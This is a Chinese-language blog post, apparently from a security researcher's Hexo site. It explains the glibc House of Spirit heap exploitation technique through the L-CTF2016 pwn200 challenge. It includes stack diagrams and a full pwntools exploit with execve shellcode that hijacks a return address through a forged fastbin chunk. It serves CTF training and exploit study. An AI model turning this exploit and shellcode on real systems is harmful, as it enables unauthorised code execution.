@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>堆漏洞之House of Spirit | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="这个漏洞利用的方式借之前做过的一道题目进行讲解，其中的pwn200之前是用修改got地址的方式，这里用House of Spirit的方式进行利用。 House of Spirit原理House of Spirit的主要思想是覆盖一个堆指针，使其指向可控的区域，构造好相关数据，释放堆指针时系统会将该区域作为chunk放到fastbin里，再申请这块区域，这块区域就可能改写目标区域。shellphi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="堆漏洞之House of Spirit">
+<meta property="og:url" content="http://example.com/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="这个漏洞利用的方式借之前做过的一道题目进行讲解，其中的pwn200之前是用修改got地址的方式，这里用House of Spirit的方式进行利用。 House of Spirit原理House of Spirit的主要思想是覆盖一个堆指针，使其指向可控的区域，构造好相关数据，释放堆指针时系统会将该区域作为chunk放到fastbin里，再申请这块区域，这块区域就可能改写目标区域。shellphi">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2017-06-26T12:46:06.000Z">
+<meta property="article:modified_time" content="2020-11-12T02:26:14.782Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-堆漏洞之House-of-Spirit" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/" class="article-date">
+  <time datetime="2017-06-26T12:46:06.000Z" itemprop="datePublished">2017-06-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      堆漏洞之House of Spirit
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这个漏洞利用的方式借之前做过的<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/10/19/L-CTF2016-PWN-Writeup/">一道题目</a>进行讲解，其中的pwn200之前是用修改got地址的方式，这里用House of Spirit的方式进行利用。</p>
+<h2 id="House-of-Spirit原理"><a href="#House-of-Spirit原理" class="headerlink" title="House of Spirit原理"></a>House of Spirit原理</h2><p>House of Spirit的主要思想是覆盖一个堆指针，使其指向可控的区域，构造好相关数据，释放堆指针时系统会将该区域作为chunk放到fastbin里，再申请这块区域，这块区域就可能改写目标区域。shellphish的<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c">github</a>里有相关的原理介绍，但是可能会比较难懂，还是看题目比较具体。</p>
+<h3 id="利用场景和思路"><a href="#利用场景和思路" class="headerlink" title="利用场景和思路"></a>利用场景和思路</h3><p>House of Spirit的利用场景如下：<br>（1）想要控制的目标区域的前面一段空间和后面一段空间都是可控的内存区域想要控制的目标区域一般为返回地址或函数指针，正常情况下，该区域是无法控制的。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|     可控区域1     |</span><br><span class="line">+------------------+</span><br><span class="line">| 目标区域（不可控， |</span><br><span class="line">| 多为返回地址或函数 |</span><br><span class="line">| 指针等）          |</span><br><span class="line">+------------------+</span><br><span class="line">|     可控区域2     |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>
+<p>（2）存在可覆盖的堆指针<br>将堆指针覆盖为上图中的可控区域。<br>存在上述场景时，可按如下思路进行利用：<br>（1）伪造堆块，在可控区域1和2中构造数据，将目标区域伪造成一个fast chunk；<br>（2）覆盖堆指针指向伪造的fast chunk；<br>（3）释放伪造的fast chunk到fastbin单链表中；<br>（4）申请刚刚释放的chunk，使得可以向目标区域中写入数据。</p>
+<blockquote>
+<p>fastbin是一个单链表结构，遵循LIFO的规则，32位系统中的fastbin大小是16~64字节，64位是32~128字节之间。</p>
+</blockquote>
+<p>想要释放堆块到fastbin，需要满足一些限制，free时相关的<a target="_blank" rel="noopener" href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#__libc_free">源代码</a>如下：  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里mmap标识位必须为0，否则会执行munmap_chunk函数。最后调用的<code>_int_free()</code>会检查：<br>（1）chunk的size不能超过fastbin的最大值（64位系统上为128）；<br>（2）下一个chunk的size要大于2 * SIZE_SZ，小于av-&gt;system_mem。<br>对应到上面的图，需要在可控区域1中伪造好size绕过mmap和size的检查，可控区域2伪造下一个chunk的size绕过最后一个检查。</p>
+<h2 id="L-CTF2016-pwn200"><a href="#L-CTF2016-pwn200" class="headerlink" title="L-CTF2016 pwn200"></a>L-CTF2016 pwn200</h2><p>题目之前讲解过，这里就介绍House of Spirit的利用方式。<br>首先还是利用输入用户名这里的off by one漏洞，输入48个字符泄露rbp的值（rbp的值是上一个栈帧的栈底位置）。接着输入id，<code>input_num()</code>接收的数字保存在栈上rbp-0x38的位置，将这个值当做可控区域2中的下一个chunk的size。<br>最后输入money，输入的money可以覆盖dest堆指针，这满足前面说的覆盖堆指针的条件。同时这个money的空间也就是可控区域1。<br>利用思路如下：<br>（1）泄露rbp，覆盖堆指针指向栈；<br>（2）伪造chunk数据；<br>（3）将伪造的chunk释放到fastbin；<br>（4）申请chunk；<br>（5）写数据到chunk，覆盖目标区域。<br>构造栈如下：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">+------------+-----</span><br><span class="line">|    ...     |</span><br><span class="line">+------------+</span><br><span class="line">|    0x41    | # 伪造的chunk size</span><br><span class="line">+------------+&lt;-fake_addr(ptr)</span><br><span class="line">|      0     |</span><br><span class="line">+------------+   ask_for_money栈帧(0x40)</span><br><span class="line">| fake_addr  | dest</span><br><span class="line">+------------+-----</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----</span><br><span class="line">|    ...     |</span><br><span class="line">+------------+</span><br><span class="line">|     32     | id # 伪造的下一个chunk的size</span><br><span class="line">+------------+   welcome栈帧(0x50)</span><br><span class="line">|  shellcode | name(0x30)</span><br><span class="line">+------------+-----</span><br><span class="line">|     rbp    |</span><br><span class="line">+------------+</span><br><span class="line">|     rip    |</span><br><span class="line">+------------+-----</span><br><span class="line">|    ...     |   main栈帧(0x10)</span><br><span class="line">+------------+&lt;----rbp_addr</span><br></pre></td></tr></table></figure>
+<p>完整的exp如下：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&#x27;127.0.0.1&#x27;, 6666)</span></span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *0x400991&quot;)</span></span><br><span class="line"></span><br><span class="line">    data = shellcode.ljust(<span class="number">46</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    data += <span class="string">&#x27;bb&#x27;</span></span><br><span class="line">    p.send(data)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;bb&#x27;</span>)</span><br><span class="line">    rbp_addr = p.recvuntil(<span class="string">&#x27;, w&#x27;</span>)[:<span class="number">-3</span>]</span><br><span class="line">    rbp_addr = u64(rbp_addr.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(rbp_addr)</span><br><span class="line"></span><br><span class="line">    fake_addr = rbp_addr - <span class="number">0x90</span></span><br><span class="line">    shellcode_addr = rbp_addr - <span class="number">0x50</span></span><br><span class="line">    <span class="comment"># 输入id伪造下一个堆块的size</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id ~~?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;money~&#x27;</span>)</span><br><span class="line">    data = p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x41</span>) <span class="comment"># 伪造堆块的size</span></span><br><span class="line">    data = data.ljust(<span class="number">0x38</span>, <span class="string">&#x27;\x00&#x27;</span>) + p64(fake_addr) <span class="comment"># 覆盖堆指针</span></span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>) <span class="comment"># 释放伪堆块进入fastbin</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;long?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\n48\n&#x27;</span>) <span class="comment"># 将伪堆块申请出来</span></span><br><span class="line">    data = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(shellcode_addr) <span class="comment"># 将eip修改为shellcode的地址</span></span><br><span class="line">    data = data.ljust(<span class="number">48</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice : &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>) <span class="comment"># 退出返回时回去执行shellcode</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>House of Spirit的主要意思是我们想要控制的区域控制不了，但它前面和后面都可以控制，所以伪造好数据将它释放到fastbin里面，后面将该内存区域当做堆块申请出来，致使该区域被当做普通的内存使用，从而目标区域就变成了可控的了。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3417.html?utm_source=tuicool&utm_medium=referral#mao">堆之House of Spirit</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2017/06/26/%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8BHouse-of-Spirit/" data-id="ckhe7o4ng005rchl71yk15q5t" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/06/28/Linux-x64%E5%86%85%E6%A0%B8ROP/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Linux x64内核ROP
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/06/24/VMware%E4%B8%8A%E8%BF%9B%E8%A1%8CLinux-Kernel%E8%B0%83%E8%AF%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">VMware上进行Linux Kernel调试</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/06/User-namespace/">User namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
